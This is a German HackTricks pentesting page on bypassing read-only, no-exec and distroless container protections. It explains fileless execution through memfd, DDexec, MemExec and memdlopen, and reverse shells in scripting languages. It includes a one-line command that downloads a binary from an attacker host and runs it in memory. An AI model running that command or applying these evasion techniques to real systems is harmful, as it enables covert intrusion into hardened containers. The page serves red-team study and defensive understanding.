# Umgehung von FS-Schutzmaßnahmen: read-only / no-exec / Distroless

{{#include ../../../../banners/hacktricks-training.md}}

## Videos

In den folgenden Videos werden die auf dieser Seite erwähnten Techniken ausführlicher erklärt:<sup>[[1]](#references)[[2]](#references)</sup>

- [**DEF CON 31 - Exploring Linux Memory Manipulation for Stealth and Evasion**](https://www.youtube.com/watch?v=poHirez8jk4)<sup>[[1]](#references)</sup>
- [**Stealth intrusions with DDexec-ng & in-memory dlopen() - HackTricks Track 2023**](https://www.youtube.com/watch?v=VM_gjjiARaU)<sup>[[2]](#references)</sup>

## read-only / no-exec-Szenario

Es kommt immer häufiger vor, dass Linux-Rechner mit einem **read-only (ro) file system-Schutz** eingebunden sind, insbesondere in Containern. Der Grund dafür ist, dass sich ein Container mit einem ro file system sehr einfach betreiben lässt, indem man **`readOnlyRootFilesystem: true`** im `securitycontext` setzt:

<pre class="language-yaml"><code class="lang-yaml">apiVersion: v1
kind: Pod
metadata:
name: alpine-pod
spec:
containers:
- name: alpine
image: alpine
securityContext:
<strong>      readOnlyRootFilesystem: true
</strong>    command: ["sh", "-c", "while true; do sleep 1000; done"]
</code></pre>

Obwohl das file system als ro eingebunden ist, bleibt **`/dev/shm`** dennoch beschreibbar. Es ist also falsch anzunehmen, dass wir nichts auf die Festplatte schreiben können. Dieser Ordner wird jedoch mit einem **no-exec-Schutz** eingebunden. Wenn du hier also eine Binary herunterlädst, kannst du sie **nicht ausführen**.

> [!WARNING]
> Aus Sicht eines Red Teams erschwert dies das **Herunterladen und Ausführen** von Binaries, die nicht bereits im System vorhanden sind, beispielsweise Backdoors oder Enumeratoren wie `kubectl`.

## Einfachste Umgehung: Scripts

Beachte, dass ich Binaries erwähnt habe. Du kannst jedes Script **ausführen**, solange sich der Interpreter auf dem Rechner befindet, beispielsweise ein **Shell-Script**, wenn `sh` vorhanden ist, oder ein **Python**-**Script**, wenn `python` installiert ist.

Dies reicht jedoch nicht aus, um deine Binary-Backdoor oder andere Binary-Tools auszuführen, die du möglicherweise benötigst.

## Umgehungen über den Speicher

Wenn du eine Binary ausführen möchtest, das file system dies jedoch nicht erlaubt, ist dies am besten möglich, indem du sie **aus dem Speicher ausführst**, da die **Schutzmaßnahmen dort nicht gelten**.

### FD + exec syscall bypass

Wenn sich leistungsfähige Script-Engines auf dem Rechner befinden, etwa **Python**, **Perl** oder **Ruby**, kannst du die auszuführende Binary in den Speicher herunterladen und sie in einem Memory File Descriptor (`create_memfd` syscall) speichern. Dieser wird von den genannten Schutzmaßnahmen nicht geschützt. Anschließend kannst du einen **`exec` syscall** aufrufen und dabei den **FD als auszuführende Datei** angeben.

Dafür kannst du einfach das Projekt [**fileless-elf-exec**](https://github.com/nnsee/fileless-elf-exec) verwenden. Du kannst ihm eine Binary übergeben. Daraufhin erstellt es ein Script in der angegebenen Sprache, das die **komprimierte und b64-encodierte Binary** sowie Anweisungen enthält, um sie zu **dekodieren und zu dekomprimieren**, in einem durch den Aufruf des `create_memfd` syscall erstellten **FD** zu speichern und anschließend den **exec** syscall aufzurufen, um sie auszuführen.

> [!WARNING]
> Dies funktioniert nicht mit anderen Script-Sprachen wie PHP oder Node, da sie **standardmäßig keine Möglichkeit zum Aufrufen roher syscalls** aus einem Script bieten. Daher ist es nicht möglich, `create_memfd` aufzurufen, um den **Memory-FD** zum Speichern der Binary zu erstellen.
>
> Außerdem funktioniert das Erstellen eines **regulären FDs** mit einer Datei in `/dev/shm` nicht, da du diese Datei nicht ausführen kannst: Der **no-exec-Schutz** gilt auch dort.

### DDexec / EverythingExec

[**DDexec / EverythingExec**](https://github.com/arget13/DDexec) ist eine Technik, mit der du den **Speicher deines eigenen Prozesses** ändern kannst, indem du dessen **`/proc/self/mem`** überschreibst.

Da du dadurch den **Assembly-Code** kontrollierst, der vom Prozess ausgeführt wird, kannst du einen **Shellcode** schreiben und den Prozess so „mutieren“, dass er **beliebigen Code** ausführt.

> [!TIP]
> Mit **DDexec / EverythingExec** kannst du deinen eigenen **Shellcode** oder **jede Binary** aus dem **Speicher** laden und **ausführen**.
```bash
# Basic example
wget -O- https://attacker.com/binary.elf | base64 -w0 | bash ddexec.sh argv0 foo bar
```
Für weitere Informationen zu dieser Technik siehe das Github-Repository oder:

{{#ref}}
ddexec.md
{{#endref}}

### MemExec

[**Memexec**](https://github.com/arget13/memexec) ist der nächste logische Schritt von DDexec. Es handelt sich um einen **daemonisierten DDexec-Shellcode**, sodass du DDexec nicht jedes Mal neu starten musst, wenn du eine **andere Binary ausführen** möchtest. Du kannst einfach den Memexec-Shellcode über die DDexec-Technik ausführen und anschließend **mit diesem Daemon kommunizieren, um neue zu ladende und auszuführende Binaries zu übergeben**.

Ein Beispiel für die Verwendung von **memexec zur Ausführung von Binaries aus einer PHP-reverse-shell** findest du unter [https://github.com/arget13/memexec/blob/main/a.php](https://github.com/arget13/memexec/blob/main/a.php).

### Memdlopen

Mit einem ähnlichen Zweck wie DDexec ermöglicht die Technik [**memdlopen**](https://github.com/arget13/memdlopen) eine **einfachere Möglichkeit, Binaries in den Speicher zu laden**, um sie später auszuführen. Dadurch können sogar Binaries mit Abhängigkeiten geladen werden.

## Distroless-Umgehung

Eine ausführliche Erklärung dazu, **was distroless tatsächlich ist**, wann es hilfreich ist, wann nicht und wie es die Post-Exploitation-Strategien in Containern verändert, findest du unter:

{{#ref}}
../../../containers-namespaces/container-security/distroless.md
{{#endref}}

### Was ist distroless?

Distroless-Container enthalten nur die **unbedingt erforderlichen Komponenten zum Ausführen einer bestimmten Anwendung oder eines bestimmten Dienstes**, etwa Bibliotheken und Runtime-Abhängigkeiten. Größere Komponenten wie einen Paketmanager, eine Shell oder Systemdienstprogramme schließen sie jedoch aus.

Das Ziel von Distroless-Containern besteht darin, **die Angriffsfläche von Containern durch das Entfernen unnötiger Komponenten zu reduzieren** und die Anzahl der ausnutzbaren Schwachstellen zu minimieren.

### Reverse Shell

In einem Distroless-Container findest du möglicherweise **nicht einmal `sh` oder `bash`**, um eine reguläre Shell zu erhalten. Außerdem wirst du keine Binaries wie `ls`, `whoami`, `id` ... finden – also nichts von dem, was du normalerweise auf einem System ausführst.

> [!WARNING]
> Daher wirst du **keine** **Reverse Shell** erhalten oder das System wie gewohnt **enumerieren** können.

Wenn der kompromittierte Container beispielsweise eine Flask-Webanwendung ausführt, ist Python installiert, und du kannst daher eine **Python-Reverse-Shell** erhalten. Wenn er Node ausführt, kannst du eine Node-rev-Shell erhalten. Dasselbe gilt für praktisch jede **Skriptsprache**.

> [!TIP]
> Mit der jeweiligen Skriptsprache könntest du das **System mithilfe der Funktionen dieser Sprache enumerieren**.

Wenn **keine `read-only/no-exec`**-Schutzmechanismen vorhanden sind, könntest du deine Reverse Shell missbrauchen, um **deine Binaries in das Dateisystem zu schreiben** und sie **auszuführen**.

> [!TIP]
> In dieser Art von Containern sind diese Schutzmechanismen jedoch normalerweise vorhanden. Du könntest aber die **zuvor beschriebenen Memory-Execution-Techniken verwenden, um sie zu umgehen**.

Beispiele dafür, wie sich einige **RCE-Schwachstellen ausnutzen** lassen, um **Reverse Shells in Skriptsprachen** zu erhalten und Binaries aus dem Speicher auszuführen, findest du unter [**https://github.com/carlospolop/DistrolessRCE**](https://github.com/carlospolop/DistrolessRCE).

## Referenzen

- [1] [DEF CON 31 - Exploring Linux Memory Manipulation for Stealth and Evasion](https://www.youtube.com/watch?v=poHirez8jk4)
- [2] [Stealth intrusions with DDexec-ng & in-memory dlopen() - HackTricks Track 2023](https://www.youtube.com/watch?v=VM_gjjiARaU)

{{#include ../../../../banners/hacktricks-training.md}}
